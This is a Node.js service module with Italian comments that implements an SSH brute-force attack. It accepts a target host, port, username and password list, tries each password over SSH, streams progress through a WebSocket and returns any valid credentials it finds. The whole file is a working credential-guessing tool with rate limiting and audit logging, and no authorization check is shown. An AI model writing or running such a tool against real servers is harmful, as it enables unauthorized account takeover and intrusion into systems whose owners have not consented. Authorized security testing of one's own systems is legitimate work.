// src/core/services/sshBruteForceService.js
const { Client } = require('ssh2');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const WebSocket = require('ws'); // Importato per il type hinting, non per creare un server

const config = require('../../config');

// =============================================================================
// CLASSI HELPER INTERNE AL MODULO
// =============================================================================

class SSHAuditLogger {
    constructor() {
        this.logDir = path.join(__dirname, '../../..', config.ssh_tool.log_dir); // Corretto il percorso relativo
        this.auditLogPath = path.join(__dirname, '../../..', config.ssh_tool.audit_log_path);
        this.errorLogPath = path.join(__dirname, '../../..', config.ssh_tool.error_log_path);
        if (!fs.existsSync(this.logDir)) {
            fs.mkdirSync(this.logDir, { recursive: true });
        }
    }
    logEvent(event) {
        const logEntry = { timestamp: new Date().toISOString(), sessionId: event.sessionId || 'N/A', ...event };
        fs.appendFileSync(this.auditLogPath, JSON.stringify(logEntry) + '\n');
        if (event.level === 'error') {
            fs.appendFileSync(this.errorLogPath, JSON.stringify(logEntry) + '\n');
        }
    }
}

class SSHErrorAnalyzer {
    static classify(err) {
        const errorMessage = err.message || err.toString();
        const errorPatterns = config.ssh_tool.error_patterns || {
            'All configured authentication methods failed': 'Credenziali errate',
            'Connection timed out': 'Timeout connessione'
        };
        for (const [pattern, message] of Object.entries(errorPatterns)) {
            if (errorMessage.includes(pattern)) return { message };
        }
        return { message: `Errore non classificato: ${errorMessage}` };
    }
}

class SSHConnectionManager {
    constructor(logger) { this.logger = logger; }
    testCredentials(host, port, username, password, sessionId) {
        return new Promise((resolve) => {
            const conn = new Client();
            let resolved = false;
            const startTime = Date.now();
            const timeout = setTimeout(() => {
                if (!resolved) { resolved = true; conn.end(); resolve({ success: false, error: 'Timeout connessione', duration: Date.now() - startTime }); }
            }, config.ssh_tool.connection_timeout);

            conn.on('ready', () => {
                if (resolved) return;
                clearTimeout(timeout);
                resolved = true;
                const duration = Date.now() - startTime;
                this.logger.logEvent({ level: 'success', event: 'SSH_LOGIN_SUCCESS', target: `${username}@${host}`, sessionId, duration });
                conn.end();
                resolve({ success: true, duration });
            });

            conn.on('error', (err) => {
                if (resolved) return;
                clearTimeout(timeout);
                resolved = true;
                const duration = Date.now() - startTime;
                const errorAnalysis = SSHErrorAnalyzer.classify(err);
                this.logger.logEvent({ level: 'error', event: 'SSH_LOGIN_FAILED', target: `${username}@${host}`, error: errorAnalysis.message, sessionId, duration });
                conn.end();
                resolve({ success: false, error: errorAnalysis.message, duration });
            });

            try {
                conn.connect({ host, port: parseInt(port), username, password, readyTimeout: config.ssh_tool.connection_timeout - 1000, algorithms: config.ssh_tool.algorithms, tryKeyboard: true });
            } catch (connectErr) {
                if (!resolved) { resolved = true; clearTimeout(timeout); resolve({ success: false, error: `Errore di connessione: ${connectErr.message}`, duration: Date.now() - startTime }); }
            }
        });
    }
}

class SSHAttackSession {
    constructor(ws, logger) { this.ws = ws; this.logger = logger; this.sshManager = new SSHConnectionManager(logger); this.sessionId = crypto.randomUUID(); this.isActive = false; }
    async start({ host, port, user, passwords }) {
        if (this.isActive) { this._sendMessage('error', 'Una sessione di attacco è già attiva.'); return; }
        if (!user || !host || !passwords || !Array.isArray(passwords) || passwords.length === 0) { this._sendMessage('error', 'Parametri di input non validi.'); return; }
        this.isActive = true;
        const targetPort = port || 22;
        this.logger.logEvent({ level: 'info', event: 'ATTACK_SESSION_START', target: `${user}@${host}:${targetPort}`, sessionId: this.sessionId, passwordCount: passwords.length });
        this._sendMessage('info', `🎯 Avvio sessione di attacco SSH su ${user}@${host}:${targetPort}`);
        
        let foundCredentials = null;
        for (let i = 0; i < passwords.length && this.isActive; i++) {
            this._sendProgress(i + 1, passwords.length);
            try {
                this._sendMessage('attack', `🔐 Tentativo ${i + 1}/${passwords.length} con utente '${user}'`);
                const result = await this.sshManager.testCredentials(host, targetPort, user, passwords[i], this.sessionId);
                if (result.success) {
                    foundCredentials = { username: user, password: passwords[i] };
                    this._sendResult(user, passwords[i]);
                    this._sendMessage('success', `✅ Credenziali valide trovate!`);
                    break;
                } else { this._sendMessage('error', `❌ ${result.error} (${result.duration}ms)`); }
            } catch (err) { this._sendMessage('error', `🚨 Errore critico durante l'attacco: ${err.message}`); }
            if (this.isActive && i < passwords.length - 1) await new Promise(res => setTimeout(res, config.ssh_tool.rate_limit_delay));
        }
        if (!foundCredentials && this.isActive) { this._sendMessage('info', '🔍 Scansione completata. Nessuna credenziale valida trovata.'); }
        this._send('finished', {});
        this.isActive = false;
    }
    stop() {
        if (!this.isActive) return;
        this.isActive = false;
        this.logger.logEvent({ level: 'warning', event: 'ATTACK_SESSION_STOPPED', sessionId: this.sessionId });
        this._sendMessage('warning', '🛑 Attacco interrotto manualmente dall\'utente.');
        this._send('finished', {});
    }
    _send(type, data) { if (this.ws.readyState === WebSocket.OPEN) this.ws.send(JSON.stringify({ type, sessionId: this.sessionId, ...data })); }
    _sendMessage(level, message) { this._send('log', { level, message }); }
    _sendProgress(current, total) { this._send('progress', { current, total, percentage: Math.round((current / total) * 100) }); }
    _sendResult(username, password) { this._send('found', { username, password }); }
}


// =============================================================================
// FUNZIONE ESPORTATA DAL MODULO
// =============================================================================

/**
 * Avvia e gestisce una sessione di attacco SSH per una data connessione WebSocket.
 * @param {WebSocket} ws - L'istanza della connessione WebSocket del client.
 * @param {object} attackParams - I parametri per l'attacco: { host, port, user, passwords }.
 * @param {SSHAuditLogger} logger - L'istanza del logger.
 * @returns {SSHAttackSession} L'istanza della sessione di attacco creata.
 */
function startSshAttackSession(ws, attackParams, logger) {
    const session = new SSHAttackSession(ws, logger);
    session.start(attackParams);
    return session;
}

module.exports = {
    startSshAttackSession,
    SSHAuditLogger // Esportiamo anche il logger per poterlo istanziare una sola volta nel server
};